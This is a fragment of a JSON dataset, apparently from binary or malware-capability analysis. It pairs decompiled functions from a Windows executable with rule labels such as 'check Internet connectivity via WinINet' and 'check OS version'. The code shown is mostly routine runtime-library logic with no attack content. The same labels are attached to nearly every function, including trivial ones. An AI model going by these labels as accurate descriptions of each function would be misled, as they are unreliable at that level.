        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Removing unreachable block (ram,0x004b57f8)\n// WARNING: Removing unreachable block (ram,0x004b591e)\n\nuint __cdecl\nfcn.004067da(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint uVar7;\n    uint arg_10h_00;\n    int64_t iVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    uVar10 = CONCAT44(arg_ch, arg_8h);\n    if (arg_ch == 0) {\n        iVar3 = 0x1f;\n        if (arg_8h != 0) {\n            for (; arg_8h >> iVar3 == 0; iVar3 = iVar3 + -1) {\n            }\n        }\n        if (arg_8h == 0) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = iVar3 + 1;\n        }\n    }\n    else {\n        iVar3 = 0x1f;\n        if (arg_ch != 0) {\n            for (; arg_ch >> iVar3 == 0; iVar3 = iVar3 + -1) {\n            }\n        }\n        if (arg_ch == 0) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = iVar3 + 1;\n        }\n        iVar3 = iVar3 + 0x20;\n    }\n    cVar1 = *(arg_1ch + 4);\n    iVar3 = (((cVar1 == '\\0') - 1 & 0x1d) + 0x18) - iVar3;\n    var_8h = arg_10h - iVar3;\n    iVar4 = ((cVar1 == '\\0') - 1 & 0x380) + 0x7f;\n    if (iVar4 < var_8h) {\ncode_r0x004b5944:\n        fcn.00405042(arg_14h, arg_1ch);\n        return 3;\n    }\n    if (var_8h < ((cVar1 == '\\0') - 1 & 0xfffffc80) - 0x7e) {\n        iVar5 = arg_10h + -1 + iVar4;\n        var_8h = -iVar4;\n        if (iVar5 < 0) {\n            if (-iVar5 < 0x40) {\n                iVar8 = fcn.004040a7();\n                fcn.004040a7();\n                if ((arg_18h == '\\0') || ((iVar8 + -1 & arg_8h | iVar8 + -1 >> 0x20 & arg_ch) != 0)) {\n                    bVar2 = true;\n                }\n                else {\n                    bVar2 = false;\n                }\n                if (((arg_8h & iVar8 | arg_ch & iVar8 >> 0x20) != 0) || (bVar2)) {\n                    fcn.00404aed();\n                }\n                iVar8 = fcn.00401b90();\n                uVar10 = iVar8 + 0xc;\n                if (uVar10 != 0) {\n                    uVar9 = fcn.00404dbd();\n                    if (uVar9 < uVar10) {\n                        var_8h = ((arg_10h - iVar5) - iVar3) + -1;\n                    }\n                    goto code_r0x004b596e;\n                }\n            }\n            fcn.004061e0(arg_14h, arg_1ch);\n            return 2;\n        }\n    }\n    else {\n        if (iVar3 < 0) {\n            if (-iVar3 < 0x40) {\n                iVar8 = fcn.004040a7();\n                fcn.004040a7();\n                if ((arg_18h == '\\0') || ((iVar8 + -1 & arg_8h | iVar8 + -1 >> 0x20 & arg_ch) != 0)) {\n                    bVar2 = true;\n                }\n                else {\n                    bVar2 = false;\n                }\n                if (((arg_8h & iVar8 | arg_ch & iVar8 >> 0x20) != 0) || (bVar2)) {\n                    fcn.00404aed();\n                }\n                iVar8 = fcn.00401b90();\n                uVar10 = iVar8 + 0xc;\n            }\n            else {\n                uVar10 = 0;\n            }\n            uVar9 = fcn.00405f01();\n            if (uVar9 < uVar10) {\n                uVar10 = uVar10 >> 1;\n                var_8h = var_8h + 1;\n                if (((*(arg_1ch + 4) == '\\0') - 1 & 0x380) + 0x7f < var_8h) goto code_r0x004b5944;\n            }\n            goto code_r0x004b596e;\n        }\n        if (iVar3 < 1) goto code_r0x004b596e;\n    }\n    uVar10 = fcn.004040a7();\ncode_r0x004b596e:\n    uVar9 = fcn.00404dbd();\n    arg_10h_00 = uVar10 & uVar9;\n    uVar7 = (uVar10 & uVar9) >> 0x20;\n    if (*(arg_1ch + 4) == '\\0') {\n        uVar6 = fcn.00401852();\n        uVar7 = fcn.004023ce(arg_14h, var_8h, arg_10h_00, uVar7, uVar6);\n    }\n    else {\n        uVar6 = fcn.004047eb();\n        uVar7 = fcn.00406861(arg_14h, var_8h, arg_10h_00, uVar7, uVar6);\n    }\n    return uVar7;\n}\n",
        "token_count": 1445
    },
    "00406857": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406857(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t **ppiVar3;\n    int32_t var_4h;\n    \n    if ((((*(arg_8h + 0x88) != 0) && (*(arg_8h + 0x88) != 0x56cd10)) && (*(arg_8h + 0x7c) != NULL)) &&\n       (**(arg_8h + 0x7c) == 0)) {\n        piVar1 = *(arg_8h + 0x84);\n        if ((piVar1 != NULL) && (*piVar1 == 0)) {\n            fcn.00406302(piVar1);\n            fcn.004033cd(*(arg_8h + 0x88));\n        }\n        piVar1 = *(arg_8h + 0x80);\n        if ((piVar1 != NULL) && (*piVar1 == 0)) {\n            fcn.00406302(piVar1);\n            fcn.0040207c(*(arg_8h + 0x88));\n        }\n        fcn.00406302(*(arg_8h + 0x7c));\n        fcn.00406302(*(arg_8h + 0x88));\n    }\n    if ((*(arg_8h + 0x8c) != NULL) && (**(arg_8h + 0x8c) == 0)) {\n        fcn.00406302(*(arg_8h + 0x90) + -0xfe);\n        fcn.00406302(*(arg_8h + 0x94) + -0x80);\n        fcn.00406302(*(arg_8h + 0x98) + -0x80);\n        fcn.00406302(*(arg_8h + 0x8c));\n    }\n    fcn.004052e0(*(arg_8h + 0x9c));\n    puVar2 = arg_8h + 0xa0;\n    var_4h = 6;\n    ppiVar3 = arg_8h + 0x28;\n    do {\n        if (((ppiVar3[-2] != 0x56cf60) && (piVar1 = *ppiVar3,  piVar1 != NULL)) && (*piVar1 == 0)) {\n            fcn.00406302(piVar1);\n            fcn.00406302(*puVar2);\n        }\n        if (((ppiVar3[-3] != NULL) && (piVar1 = ppiVar3[-1],  piVar1 != NULL)) && (*piVar1 == 0)) {\n            fcn.00406302(piVar1);\n        }\n        puVar2 = puVar2 + 1;\n        ppiVar3 = ppiVar3 + 4;\n        var_4h = var_4h + -1;\n    } while (var_4h != 0);\n    fcn.00406302(arg_8h);\n    return;\n}\n",
        "token_count": 685
    },
    "00406884": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406884(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00405eed(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 297
    },
    "004068c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004068c0(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uStack8;\n    \n    if (arg_10h == 0x3000) {\n        uStack8 = 0xd;\n        arg_8h = uStack8;\n    }\n    else if ((arg_ch < 0) || ((arg_ch < 1 && (arg_8h == 0)))) {\n        if ((arg_8h | arg_ch) == 0) {\n            return arg_10h == 0;\n        }\n        uStack8 = 6;\n        arg_8h = uStack8;\n    }\n    return arg_8h;\n}\n",
        "token_count": 165
    },
    "004068ca": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004068ca(uint noname_0, uint arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t arg_ch_00;\n    uint uVar3;\n    int32_t extraout_ECX;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint *puVar6;\n    uint var_3ch;\n    uint var_10h;\n    uint var_4h;\n    int32_t iVar4;\n    \n    fcn.004030e9(0x30);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    puVar2 = fcn.004026d5(unaff_EBP + -0x3c);\n    puVar6 = extraout_ECX + 0x2c;\n    for (iVar5 = 0xb; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    arg_ch_00 = fcn.00401366();\n    iVar5 = *(unaff_EBP + -0x10);\n    *(unaff_EBP + -0x10) = iVar5;\n    *(iVar5 + 8) = 0;\n    *(iVar5 + 0x10) = 0;\n    *(iVar5 + 0x14) = 0;\n    *(iVar5 + 0x18) = 0;\n    uVar3 = *(arg_ch_00 + 0x1c);\n    *(unaff_EBP + -4) = 0;\n    uVar3 = fcn.00401c8f(uVar3);\n    *(iVar5 + 8) = uVar3;\n    fcn.004057c2(0, arg_ch_00);\n    if (*(iVar5 + 0x28) == '\\0') {\n        cVar1 = *(arg_ch_00 + 0x29);\n    }\n    else {\n        cVar1 = *(arg_ch_00 + 0x28);\n    }\n    iVar4 = cVar1;\n    *(iVar5 + 0x1c) = iVar4;\n    if ((iVar4 < 0) || (0x7e < iVar4)) {\n        *(iVar5 + 0x1c) = 0;\n    }\n    fcn.00401834(iVar5 + 0x20, *(arg_ch_00 + 0x2b), *(arg_ch_00 + 0x2a), *(arg_ch_00 + 0x2e));\n    fcn.00401834(iVar5 + 0x24, *(arg_ch_00 + 0x2d), *(arg_ch_00 + 0x2c), *(arg_ch_00 + 0x2f));\n    if (*(unaff_EBP + 0xc) != '\\0') {\n        *(iVar5 + 0x20) = 0x76782b24;\n        *(iVar5 + 0x24) = 0x76782b24;\n    }\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 739
    },
    "004068e3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004068e3(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    if ((*(in_ECX + 4) != '\\x03') && ('\\x01' < *(arg_8h + 4))) {\n        *(in_ECX + 4) = *(arg_8h + 4);\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "0048893e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048893e(uint noname_0, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t *unaff_EDI;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    \n    *(*(unaff_EBP + 0xc) + -4) = *(unaff_EBP + -0x30);\n    fcn.00406596(*(unaff_EBP + -0x34));\n    iVar1 = fcn.00402ad6();\n    *(iVar1 + 0x10) = *(unaff_EBP + -0x38);\n    iVar1 = fcn.00402ad6();\n    *(iVar1 + 0x14) = *(unaff_EBP + -0x3c);\n    if ((((*unaff_EDI == -0x1f928c9d) && (unaff_EDI[4] == 3)) &&\n        ((unaff_EDI[5] == 0x19930520 || ((unaff_EDI[5] == 0x19930521 || (unaff_EDI[5] == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x40) == 0 && (unaff_EBX != 0)))) {\n        iVar1 = fcn.00403008(unaff_EDI[6]);\n        if (iVar1 != 0) {\n            fcn.00403206(unaff_EDI);\n        }\n    }\n    return;\n}\n",
        "token_count": 373
    },
    "00488bc1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00488bc1(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402ad6();\n    if (0 < *(iVar1 + 0x18)) {\n        iVar1 = fcn.00402ad6();\n        *(iVar1 + 0x18) = *(iVar1 + 0x18) + -1;\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "00492d3e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00492d3e(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint *var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if ((arg_10h != 0) && (arg_14h != 0)) {\n        var_20h = &arg_10h;\n        var_8h = arg_10h;\n        var_1ch = &arg_18h;\n        var_18h = &arg_8h;\n        var_ch = arg_10h;\n        var_14h = &arg_14h;\n        var_10h = &arg_1ch;\n        uVar2 = fcn.004929df(&var_ch, &var_20h);\n        return uVar2;\n    }\n    puVar1 = fcn.004039a4();\n    *puVar1 = 0x16;\n    fcn.00403751();\n    return 0xffffffff;\n}\n",
        "token_count": 316
    },
    "00492dbb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00492dbb(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint *var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if ((arg_10h != 0) && (arg_14h != 0)) {\n        var_20h = &arg_10h;\n        var_8h = arg_10h;\n        var_1ch = &arg_18h;\n        var_18h = &arg_8h;\n        var_ch = arg_10h;\n        var_14h = &arg_14h;\n        var_10h = &arg_1ch;\n        uVar2 = fcn.0049296e(&var_ch, &var_20h);\n        return uVar2;\n    }\n    puVar1 = fcn.004039a4();\n    *puVar1 = 0x16;\n    fcn.00403751();\n    return 0xffffffff;\n}\n",
        "token_count": 316
    },
    "00492e38": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00492e38(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint *var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if ((arg_10h != 0) && (arg_14h != 0)) {\n        var_20h = &arg_10h;\n        var_8h = arg_10h;\n        var_1ch = &arg_18h;\n        var_18h = &arg_8h;\n        var_ch = arg_10h;\n        var_14h = &arg_14h;\n        var_10h = &arg_1ch;\n        uVar2 = fcn.00492ac1(&var_ch, &var_20h);\n        return uVar2;\n    }\n    puVar1 = fcn.004039a4();\n    *puVar1 = 0x16;\n    fcn.00403751();\n    return 0xffffffff;\n}\n",
        "token_count": 316
    },
    "00492eb5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00492eb5(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint *var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if ((arg_10h != 0) && (arg_14h != 0)) {\n        var_20h = &arg_10h;\n        var_8h = arg_10h;\n        var_1ch = &arg_18h;\n        var_18h = &arg_8h;\n        var_ch = arg_10h;\n        var_14h = &arg_14h;\n        var_10h = &arg_1ch;\n        uVar2 = fcn.00492ba3(&var_ch, &var_20h);\n        return uVar2;\n    }\n    puVar1 = fcn.004039a4();\n    *puVar1 = 0x16;\n    fcn.00403751();\n    return 0xffffffff;\n}\n",
        "token_count": 316
    },
    "00492f32": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00492f32(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint *var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if ((arg_10h != 0) && (arg_14h != 0)) {\n        var_20h = &arg_10h;\n        var_8h = arg_10h;\n        var_1ch = &arg_18h;\n        var_18h = &arg_8h;\n        var_ch = arg_10h;\n        var_14h = &arg_14h;\n        var_10h = &arg_1ch;\n        uVar2 = fcn.00492b32(&var_ch, &var_20h);\n        return uVar2;\n    }\n    puVar1 = fcn.004039a4();\n    *puVar1 = 0x16;\n    fcn.00403751();\n    return 0xffffffff;\n}\n",
        "token_count": 316
    },
    "00492faf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00492faf(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint *var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if ((arg_10h != 0) && (arg_14h != 0)) {\n        var_20h = &arg_10h;\n        var_8h = arg_10h;\n        var_1ch = &arg_18h;\n        var_18h = &arg_8h;\n        var_ch = arg_10h;\n        var_14h = &arg_14h;\n        var_10h = &arg_1ch;\n        uVar2 = fcn.00492a50(&var_ch, &var_20h);\n        return uVar2;\n    }\n    puVar1 = fcn.004039a4();\n    *puVar1 = 0x16;\n    fcn.00403751();\n    return 0xffffffff;\n}\n",
        "token_count": 315
    },
    "00498cd9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00498cd9(uint *param_1)\n\n{\n    uint arg_8h;\n    uint8_t uVar1;\n    uint arg_10h;\n    int32_t var_474h;\n    uint var_470h;\n    uint var_468h;\n    uint32_t var_464h;\n    uint var_460h;\n    uint var_45ch;\n    uint var_41ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    arg_8h = **param_1;\n    uVar1 = fcn.00404264(arg_8h);\n    var_464h = var_464h & 0xffffff00 | uVar1;\n    fcn.004057e5(*param_1[1]);\n    var_460h = **param_1;\n    arg_10h = param_1[2][1];\n    fcn.00403f44(&var_460h, *param_1[2], arg_10h, *param_1[3], &var_470h, *param_1[4]);\n    var_ch = 0;\n    fcn.00403035();\n    fcn.00404647();\n    if (var_468h != '\\0') {\n        *(var_474h + 0x350) = *(var_474h + 0x350) & 0xfffffffd;\n    }\n    fcn.00405943(var_464h, arg_8h);\n    fcn.00403085(arg_10h);\n    return;\n}\n",
        "token_count": 370
    },
    "00498dfe": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00498dfe(uint *param_1)\n\n{\n    uint arg_8h;\n    uint8_t uVar1;\n    uint arg_10h;\n    int32_t var_474h;\n    uint var_470h;\n    uint var_468h;\n    uint32_t var_464h;\n    uint var_460h;\n    uint var_45ch;\n    uint var_41ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    arg_8h = **param_1;\n    uVar1 = fcn.00404264(arg_8h);\n    var_464h = var_464h & 0xffffff00 | uVar1;\n    fcn.004057e5(*param_1[1]);\n    var_460h = **param_1;\n    arg_10h = param_1[2][1];\n    fcn.00403f44(&var_460h, *param_1[2], arg_10h, *param_1[3], &var_470h, *param_1[4]);\n    var_ch = 0;\n    fcn.00406028();\n    fcn.00404647();\n    if (var_468h != '\\0') {\n        *(var_474h + 0x350) = *(var_474h + 0x350) & 0xfffffffd;\n    }\n    fcn.00405943(var_464h, arg_8h);\n    fcn.00403085(arg_10h);\n    return;\n}\n",
        "token_count": 370
    },
    "00498f02": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00498f02(uint *param_1)\n\n{\n    uint arg_8h;\n    uint8_t uVar1;\n    uint *arg_10h;\n    int32_t var_ae0h;\n    uint var_adch;\n    uint var_ad4h;\n    uint var_ad0h;\n    uint var_acch;\n    uint32_t var_ac8h;\n    uint var_ac4h;\n    uint var_ac0h;\n    uint *var_abch;\n    uint var_ab8h;\n    uint var_ab4h;\n    uint var_a74h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    arg_8h = **param_1;\n    uVar1 = fcn.00404264(arg_8h);\n    var_ac8h = var_ac8h & 0xffffff00 | uVar1;\n    fcn.004057e5(*param_1[1]);\n    var_ac4h = **param_1;\n    var_ab8h = *param_1[4];\n    var_abch = &var_adch;\n    var_ac0h = *param_1[3];\n    var_ad0h = *param_1[2];\n    var_acch = param_1[2][1];\n    arg_10h = &var_ac0h;\n    fcn.00403fee(&var_ac4h, &var_ad0h, arg_10h, &var_abch, &var_ab8h);\n    fcn.00405cfe();\n    fcn.00404647();\n    if (var_ad4h != '\\0') {\n        *(var_ae0h + 0x350) = *(var_ae0h + 0x350) & 0xfffffffd;\n    }\n    fcn.00405943(var_ac8h, arg_8h);\n    fcn.00403085(arg_10h);\n    return;\n}\n",
        "token_count": 445
    },
    "00499033": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00499033(uint *param_1)\n\n{\n    uint arg_8h;\n    uint8_t uVar1;\n    uint *arg_10h;\n    int32_t var_ae0h;\n    uint var_adch;\n    uint var_ad4h;\n    uint var_ad0h;\n    uint var_acch;\n    uint32_t var_ac8h;\n    uint var_ac4h;\n    uint var_ac0h;\n    uint *var_abch;\n    uint var_ab8h;\n    uint var_ab4h;\n    uint var_a74h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    arg_8h = **param_1;\n    uVar1 = fcn.00404264(arg_8h);\n    var_ac8h = var_ac8h & 0xffffff00 | uVar1;\n    fcn.004057e5(*param_1[1]);\n    var_ac4h = **param_1;\n    var_ab8h = *param_1[4];\n    var_abch = &var_adch;\n    var_ac0h = *param_1[3];\n    var_ad0h = *param_1[2];\n    var_acch = param_1[2][1];\n    arg_10h = &var_ac0h;\n    fcn.00406780(&var_ac4h, &var_ad0h, arg_10h, &var_abch, &var_ab8h);\n    fcn.00404e58();\n    fcn.00404647();\n    if (var_ad4h != '\\0') {\n        *(var_ae0h + 0x350) = *(var_ae0h + 0x350) & 0xfffffffd;\n    }\n    fcn.00405943(var_ac8h, arg_8h);\n    fcn.00403085(arg_10h);\n    return;\n}\n",
        "token_count": 444
    },
    "0049916f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0049916f(uint *param_1)\n\n{\n    uint arg_8h;\n    uint8_t uVar1;\n    uint arg_10h;\n    int32_t var_474h;\n    uint var_470h;\n    uint var_468h;\n    uint32_t var_464h;\n    uint var_460h;\n    uint var_45ch;\n    uint var_41ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    arg_8h = **param_1;\n    uVar1 = fcn.00404264(arg_8h);\n    var_464h = var_464h & 0xffffff00 | uVar1;\n    fcn.004057e5(*param_1[1]);\n    var_460h = **param_1;\n    arg_10h = param_1[2][1];\n    fcn.00401a1e(&var_460h, *param_1[2], arg_10h, *param_1[3], &var_470h, *param_1[4]);\n    var_ch = 0;\n    fcn.004046ba();\n    fcn.00404647();\n    if (var_468h != '\\0') {\n        *(var_474h + 0x350) = *(var_474h + 0x350) & 0xfffffffd;\n    }\n    fcn.00405943(var_464h, arg_8h);\n    fcn.00403085(arg_10h);\n    return;\n}\n",
        "token_count": 371
    },
    "0049927e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
